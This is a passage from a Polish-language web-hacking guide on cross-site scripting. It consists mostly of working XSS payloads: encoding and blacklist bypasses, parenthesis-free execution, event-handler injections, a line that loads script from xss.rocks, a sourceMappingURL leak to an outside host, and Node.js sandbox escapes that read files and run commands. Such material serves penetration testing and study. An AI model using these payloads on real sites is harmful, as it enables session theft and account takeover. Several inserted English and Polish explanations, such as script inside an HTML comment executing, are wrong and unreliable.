Jeśli `<>` są oczyszczane, nadal możesz **unieważnić ciąg znaków** tam, gdzie znajduje się twoje wejście i **wykonać dowolny kod JS**. Ważne jest, aby **poprawić składnię JS**, ponieważ jeśli wystąpią jakiekolwiek błędy, kod JS nie zostanie wykonany:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
### Szablony literałów \`\`

Aby konstruować **łańcuchy znaków** oprócz pojedynczych i podwójnych cudzysłowów, JS akceptuje również **backticki** **` `` `**. Jest to znane jako szablony literałów, ponieważ pozwalają na **osadzanie wyrażeń JS** za pomocą składni `${ ... }`.\
Dlatego, jeśli zauważysz, że wprowadzone dane są **odbijane** wewnątrz łańcucha znaków JS, który używa backticków, możesz wykorzystać składnię `${ ... }` do wykonania **dowolnego kodu JS**:

Można to **wykorzystać** za pomocą:
```javascript
`${alert(1)}`
`${`${`${`${alert(1)}`}`}`}`
```

```````````````javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop(){return loop}
loop``````````````
```````````````
### Wykonywanie zakodowanego kodu

W niektórych przypadkach, atakujący może próbować wykorzystać kodowanie, aby wykonać złośliwy kod na stronie internetowej. Jest to znane jako atak na wykonanie zakodowanego kodu. Atakujący może użyć różnych technik kodowania, takich jak kodowanie URL, kodowanie HTML lub kodowanie JavaScript, aby ukryć złośliwy kod i oszukać filtrację danych.

Atakujący może wprowadzić złośliwy kod, który zostanie wykonany przez przeglądarkę użytkownika, co może prowadzić do różnych konsekwencji, takich jak kradzież danych, przejęcie konta użytkownika lub zainfekowanie systemu użytkownika złośliwym oprogramowaniem.

Aby chronić się przed atakami na wykonanie zakodowanego kodu, ważne jest, aby odpowiednio filtrować i walidować dane wejściowe. Należy unikać bezpośredniego wstawiania danych użytkownika do kodu strony internetowej i zawsze używać odpowiednich funkcji filtrujących, takich jak `htmlspecialchars` w PHP, aby unieważnić znaki specjalne.

Pamiętaj, że atakujący może próbować różnych technik kodowania, dlatego ważne jest, aby zrozumieć różne metody kodowania i wiedzieć, jak je skutecznie zablokować.
```markup
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</iframe>">
```
### Unicode Encode JS execution

#### Description
This technique involves encoding JavaScript code using Unicode characters to bypass input validation and execute arbitrary code on a vulnerable web application.

#### Exploitation
1. Identify a vulnerable input field where JavaScript code can be injected.
2. Craft the payload by encoding the JavaScript code using Unicode characters. For example, the Unicode representation of the `<script>` tag is `\u003cscript\u003e`.
3. Inject the encoded payload into the vulnerable input field.
4. When the web application processes the input, it will decode the Unicode characters and execute the JavaScript code.
5. The executed code can perform various actions, such as stealing user credentials, redirecting the user to a malicious website, or performing other malicious activities.

#### Prevention
To prevent this type of attack, it is important to implement proper input validation and sanitization techniques. This includes:
- Implementing a whitelist approach for input validation, allowing only known safe characters.
- Using input validation libraries or frameworks that have built-in protection against Unicode encoding attacks.
- Regularly updating and patching the web application to fix any known vulnerabilities.
- Educating developers about secure coding practices and the risks associated with input validation failures.

#### Example
Consider a vulnerable web application that allows users to submit comments. The application fails to properly validate and sanitize the input, making it susceptible to XSS attacks.

An attacker can exploit this vulnerability by injecting the following payload into the comment field:

```
<script>alert('XSS')</script>
```

To bypass input validation, the attacker can encode the payload using Unicode characters:

```
\u003cscript\u003ealert(\u0027XSS\u0027)\u003c/script\u003e
```

When the web application processes the comment, it will decode the Unicode characters and execute the JavaScript code, resulting in an alert box displaying the text "XSS".
```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
```
### Techniki omijania czarnych list w JavaScript

**Łańcuchy znaków**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**Specjalne ucieczki**

In some cases, the traditional HTML entities may not work to escape characters in XSS attacks. In such situations, special escapes can be used to bypass filters and successfully execute the attack.

Below are some commonly used special escapes:

- **Double URL encoding**: This involves encoding the special characters twice using URL encoding. For example, the `<` character can be encoded as `%253C` instead of the traditional `%3C`.

- **Hex encoding**: This involves encoding the special characters using their hexadecimal representation. For example, the `<` character can be encoded as `%3C` instead of the traditional `&#x3C;`.

- **UTF-8 encoding**: This involves encoding the special characters using their UTF-8 representation. For example, the `<` character can be encoded as `%C0%BC` instead of the traditional `&#65308;`.

- **CSS escape sequences**: This involves using CSS escape sequences to represent special characters. For example, the `<` character can be represented as `\3C` instead of the traditional `&#x3C;`.

- **JavaScript escape sequences**: This involves using JavaScript escape sequences to represent special characters. For example, the `<` character can be represented as `\x3C` instead of the traditional `&#x3C;`.

It is important to note that the effectiveness of these special escapes may vary depending on the context and the specific filter being used. Therefore, it is recommended to test different combinations and variations to find the most effective escape sequence for a particular XSS attack.
```javascript
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
// Any other char escaped is just itself
```
**Zamiana spacji wewnątrz kodu JS**

W niektórych przypadkach, gdy atakujący próbuje wstrzyknąć kod XSS, może napotkać na ograniczenia, które uniemożliwiają użycie spacji w kodzie JavaScript. Jednak istnieje kilka sposobów na obejście tego problemu poprzez zastosowanie zamiany spacji na inne znaki.

Jedną z technik jest zamiana spacji na znaki takie jak `%09` (tabulator), `%0A` (znak nowej linii) lub `%0D` (znak powrotu karetki). Można to zrobić za pomocą funkcji `replace()` w JavaScript.

Przykład:

```javascript
var payload = "alert('XSS%09payload')";
var sanitizedPayload = payload.replace(/ /g, "%09");
```

W powyższym przykładzie, spacje wewnątrz ciągu znaków zostaną zamienione na `%09`, co pozwoli na wstrzyknięcie kodu XSS.

Inną techniką jest użycie znaku `+` jako zamiany dla spacji. Można to zrobić za pomocą funkcji `replace()` w JavaScript.

Przykład:

```javascript
var payload = "alert('XSS+payload')";
var sanitizedPayload = payload.replace(/ /g, "+");
```

W tym przypadku, spacje zostaną zamienione na znak `+`, co umożliwi wstrzyknięcie kodu XSS.

Pamiętaj, że te techniki mogą być przydatne tylko w przypadku, gdy spacje są blokowane lub filtrowane w kodzie JavaScript. W innych przypadkach, zaleca się stosowanie innych technik wstrzykiwania kodu XSS.
```javascript
<TAB>
/**/
```
**Komentarze JavaScript (z triku** [**Komentarze JavaScript**](./#komentarze-javascript) **)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**Nowe linie w JavaScript (z triku** [**Nowa linia w JavaScript**](./#nowe-linie-w-javascript) **)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10); alert('//\nalert(1)') //0x0a
String.fromCharCode(13); alert('//\ralert(1)') //0x0d
String.fromCharCode(8232); alert('//\u2028alert(1)') //0xe2 0x80 0xa8
String.fromCharCode(8233); alert('//\u2029alert(1)') //0xe2 0x80 0xa9
```
**Białe znaki w JavaScript**

W przypadku ataków XSS (Cross-Site Scripting), białe znaki w kodzie JavaScript mogą być wykorzystane do uniknięcia detekcji i utrudnienia analizy. Poniżej przedstawiam kilka technik związanych z białymi znakami w JavaScript:

- **Znaki nowej linii**: Można użyć znaków nowej linii, takich jak `\n` lub `\r\n`, aby rozdzielić kod JavaScript na wiele linii. Jest to przydatne, gdy filtr XSS ignoruje znaki nowej linii.

- **Znaki tabulacji**: Znaki tabulacji, takie jak `\t`, mogą być używane do dodania odstępów w kodzie JavaScript. Może to pomóc w ukryciu złośliwego kodu przed analizą.

- **Znaki komentarza**: Można umieścić złośliwy kod JavaScript wewnątrz komentarza, aby go ukryć. Na przykład, `/* złośliwy kod */`.

- **Znaki Unicode**: Można użyć znaków Unicode, takich jak `\u200B` (Zero Width Space) lub `\u2028` (Line Separator), aby ukryć złośliwy kod. Te znaki są traktowane jako białe znaki i mogą być ignorowane przez filtry XSS.

- **Znaki HTML**: Znaki HTML, takie jak `&nbsp;` (Non-Breaking Space) lub `&#8203;` (Zero Width Space), mogą być używane jako białe znaki w kodzie JavaScript. Filtry XSS mogą je zignorować, co ułatwia ukrycie złośliwego kodu.

Pamiętaj, że wykorzystanie białych znaków w celu ukrycia złośliwego kodu jest jedną z wielu technik stosowanych w atakach XSS. Ważne jest, aby zawsze stosować odpowiednie zabezpieczenia, takie jak filtrowanie i walidacja danych wejściowych, aby zapobiec takim atakom.
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript wewnątrz komentarza**

W niektórych przypadkach, jeśli strona internetowa nie jest odpowiednio zabezpieczona, można umieścić kod JavaScript wewnątrz komentarza HTML. Kiedy przeglądarka renderuje stronę, kod ten może zostać wykonany, co umożliwia atakującemu wstrzyknięcie złośliwego kodu na stronie. Aby to zrobić, wystarczy umieścić kod JavaScript wewnątrz znacznika komentarza HTML (`<!-- -->`). Przykład:

```html
<!-- <script>alert('XSS');</script> -->
```

Jeśli strona nie filtrowała lub nie zabezpieczyła poprawnie komentarzy, kod JavaScript wewnątrz komentarza zostanie wykonany, wyświetlając alert z treścią "XSS". To może prowadzić do różnych ataków, takich jak kradzież danych użytkownika, przechwycenie sesji lub manipulacja zawartości strony.
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript bez nawiasów**

W niektórych przypadkach, gdy wstrzykujemy kod JavaScript do strony, możemy uniknąć użycia nawiasów, co może ułatwić nam wykorzystanie podatności XSS. W przypadku, gdy wstrzykujemy kod JavaScript bez nawiasów, musimy jednak pamiętać o kilku rzeczach:

- Musimy używać tylko jednego wyrażenia JavaScript.
- Musimy unikać użycia operatorów przypisania, takich jak `=`, `+=`, `-=`, itp.
- Musimy unikać użycia operatorów porównania, takich jak `==`, `===`, `!=`, `!==`, itp.
- Musimy unikać użycia operatorów logicznych, takich jak `&&`, `||`, `!`, itp.

Przykład:

```html
<script>
  alert`XSS without parentheses`;
</script>
```

W powyższym przykładzie, kod JavaScript `alert` jest wstrzykiwany bez użycia nawiasów.
````javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x```

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.
````
* [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
* [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**Dowolne wywołanie funkcji (alert)**
````javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
````
## **Podatności DOM**

Istnieje **kod JS**, który używa **niebezpiecznych danych kontrolowanych przez atakującego**, takich jak `location.href`. Atakujący może wykorzystać to do wykonania dowolnego kodu JS.\
**Ze względu na rozszerzenie wyjaśnienia na temat** [**podatności DOM, zostało przeniesione na tę stronę**](dom-xss.md)**:**

{% content-ref url="dom-xss.md" %}
[dom-xss.md](dom-xss.md)
{% endcontent-ref %}

Tam znajdziesz szczegółowe **wyjaśnienie, czym są podatności DOM, jak są wywoływane i jak je wykorzystać**.\
Nie zapomnij również, że **na końcu wspomnianego postu** znajdziesz wyjaśnienie na temat [**ataków clobbering DOM**](dom-xss.md#dom-clobbering).

## Inne sposoby obejścia

### Unicode znormalizowane

Możesz sprawdzić, czy **odbijane wartości** są **znormalizowane za pomocą Unicode** na serwerze (lub po stronie klienta) i wykorzystać tę funkcjonalność do obejścia zabezpieczeń. [**Znajdź przykład tutaj**](../unicode-injection/#xss-cross-site-scripting).

### Ominięcie flagi PHP FILTER\_VALIDATE\_EMAIL
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Pomijanie Ruby-On-Rails

Ze względu na **masowe przypisanie RoR** cudzysłowy są wstawiane w HTML, a następnie ograniczenie cudzysłowów jest omijane i dodatkowe pola (onfocus) mogą być dodane wewnątrz tagu.\
Przykład formularza ([z tego raportu](https://hackerone.com/reports/709336)), jeśli wyślesz payload:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
Para "Klucz", "Wartość" zostanie odtworzone w ten sposób:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
### Specjalne kombinacje

In some cases, the onfocus attribute can be combined with other HTML attributes to create more complex XSS attacks. Here are some examples:

#### 1. onfocus + onload

```html
<input type="text" onfocus="alert(1)" onload="alert(2)">
```

In this example, the onfocus attribute triggers an alert when the input field is focused, while the onload attribute triggers another alert when the page finishes loading.

#### 2. onfocus + onmouseover

```html
<input type="text" onfocus="alert(1)" onmouseover="alert(2)">
```

In this example, the onfocus attribute triggers an alert when the input field is focused, while the onmouseover attribute triggers another alert when the mouse pointer is moved over the input field.

#### 3. onfocus + onblur

```html
<input type="text" onfocus="alert(1)" onblur="alert(2)">
```

In this example, the onfocus attribute triggers an alert when the input field is focused, while the onblur attribute triggers another alert when the input field loses focus.

These combinations can be used to create more sophisticated XSS attacks by chaining multiple events together. It is important to understand how different attributes interact with each other to fully exploit XSS vulnerabilities.
```markup
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### XSS z wstrzyknięciem nagłówków w odpowiedzi 302

Jeśli odkryjesz, że możesz **wstrzyknąć nagłówki w odpowiedzi przekierowania 302**, możesz spróbować **spowodować wykonanie dowolnego kodu JavaScript przez przeglądarkę**. Jest to jednak **niełatwe**, ponieważ nowoczesne przeglądarki nie interpretują treści odpowiedzi HTTP, jeśli kod statusu odpowiedzi HTTP to 302, więc sam payload cross-site scripting jest bezużyteczny.

W [**tym raporcie**](https://www.gremwell.com/firefox-xss-302) i [**tym**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) możesz przeczytać, jak przetestować kilka protokołów w nagłówku Location i sprawdzić, czy którykolwiek z nich pozwala przeglądarce na sprawdzenie i wykonanie payloadu XSS w treści odpowiedzi.

Znane protokoły: `mailto://`, `//x:1/`, `ws://`, `wss://`, _pusty nagłówek Location_, `resource://`.

### Tylko litery, cyfry i kropki

Jeśli możesz wskazać **wywołanie zwrotne (callback)**, które JavaScript ma **wykonać**, ograniczone do tych znaków, [**przeczytaj tę sekcję tego posta**](./#javascript-function), aby dowiedzieć się, jak wykorzystać to zachowanie.

### Poprawne typy zawartości `<script>` do XSS

(Z [**tego źródła**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Jeśli spróbujesz załadować skrypt o **typie zawartości** takim jak `application/octet-stream`, Chrome wyświetli następujący błąd:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Jedynymi **typami zawartości**, które Chrome obsłuży do uruchomienia **załadowanego skryptu**, są te zawarte w stałej **`kSupportedJavascriptTypes`** z [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### Typy skryptów do XSS

(Z [**tutaj**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/) ) Więc, jakie typy mogą wskazywać na załadowanie skryptu?
```html
<script type="???"></script>
```
Odpowiedź:

* **moduł** (domyślny, nic do wyjaśnienia)
* [**webbundle**](https://web.dev/web-bundles/): Web Bundles to funkcja, która umożliwia pakowanie wielu danych (HTML, CSS, JS...) w jednym pliku **`.wbn`**.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
* [**importmap**](https://github.com/WICG/import-maps)**:** Pozwala poprawić składnię importowania
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment";
import { partition } from "lodash";
</script>
```
To zachowanie zostało wykorzystane w [**tym rozwiązaniu**](https://github.com/zwade/yaca/tree/master/solution), aby przemapować bibliotekę na eval i wykorzystać to do wywołania XSS.

* [**speculationrules**](https://github.com/WICG/nav-speculation)**:** Ta funkcja służy głównie do rozwiązania pewnych problemów spowodowanych wstępnym renderowaniem. Działa to w ten sposób:
```html
<script type="speculationrules">
{
"prerender": [
{"source": "list",
"urls": ["/page/2"],
"score": 0.5},
{"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1}
]
}
</script>
```
### Typy zawartości sieciowej podatne na XSS

(Z [**tutaj**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Następujące typy zawartości mogą wykonywać XSS we wszystkich przeglądarkach:

* text/html
* application/xhtml+xml
* application/xml
* text/xml
* image/svg+xml
* text/plain (?? nie ma na liście, ale chyba widziałem to w CTF)
* application/rss+xml (wyłączone)
* application/atom+xml (wyłączone)

W innych przeglądarkach można użyć innych **`Typów zawartości`** do wykonania dowolnego kodu JS, sprawdź: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### Typ zawartości xml

Jeśli strona zwraca typ zawartości text/xml, można wskazać przestrzeń nazw i wykonać dowolny kod JS:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### Specjalne wzorce zastępowania

Kiedy używane jest coś takiego jak **`"some {{template}} data".replace("{{template}}", <user_input>)`**, atakujący może użyć [**specjalnych zastąpień ciągów**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global\_Objects/String/replace#specifying\_a\_string\_as\_the\_replacement) w celu próby obejścia niektórych zabezpieczeń: ``"123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"}))``

Na przykład w [**tym opracowaniu**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA) zostało to użyte do **wydobycia ciągu JSON** wewnątrz skryptu i wykonania dowolnego kodu.

### Chrome Cache do XSS

{% content-ref url="chrome-cache-to-xss.md" %}
[chrome-cache-to-xss.md](chrome-cache-to-xss.md)
{% endcontent-ref %}

### Ucieczka z więzienia XS Jails

Jeśli masz do dyspozycji tylko ograniczony zestaw znaków, sprawdź te inne poprawne rozwiązania problemów z XSJail:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
Jeśli **wszystko jest niezdefiniowane** przed wykonaniem niezaufanego kodu (jak w [**tym artykule**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#miscx2fundefined55-solves)), możliwe jest generowanie przydatnych obiektów "z niczego", aby nadużyć wykonania dowolnego niezaufanego kodu:

* Korzystając z import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then(m=>console.log(m.readFileSync("/flag.txt", "utf8")))
```
* Dostęp do `require` pośrednio

[Zgodnie z tym](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) moduły są owinięte przez Node.js w funkcję, tak jak to:
```javascript
(function (exports, require, module, __filename, __dirname) {
// our actual module code
});
```
Dlatego, jeśli z tego modułu możemy **wywołać inną funkcję**, możliwe jest użycie `arguments.callee.caller.arguments[1]` z tej funkcji, aby uzyskać dostęp do **`require`**:

{% code overflow="wrap" %}
```javascript
(function(){return arguments.callee.caller.arguments[1]("fs").readFileSync("/flag.txt", "utf8")})()
```
{% endcode %}

Podobnie jak w poprzednim przykładzie, możliwe jest **użycie obsługiwania błędów** do uzyskania dostępu do **opakowania** modułu i uzyskania funkcji **`require`**:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = ''.constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log('='.repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req('child_process').execSync('id').toString())
}
}
}
trigger()
```
### Obfuskacja i zaawansowane omijanie

* **Różne obfuskacje na jednej stronie:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
* [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
* [https://ooze.ninja/javascript/poisonjs](https://ooze.ninja/javascript/poisonjs)
* [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
* [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
* [http://www.jsfuck.com/](http://www.jsfuck.com)
* Bardziej zaawansowany JSFuck: [https://medium.com/@Master\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
* [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
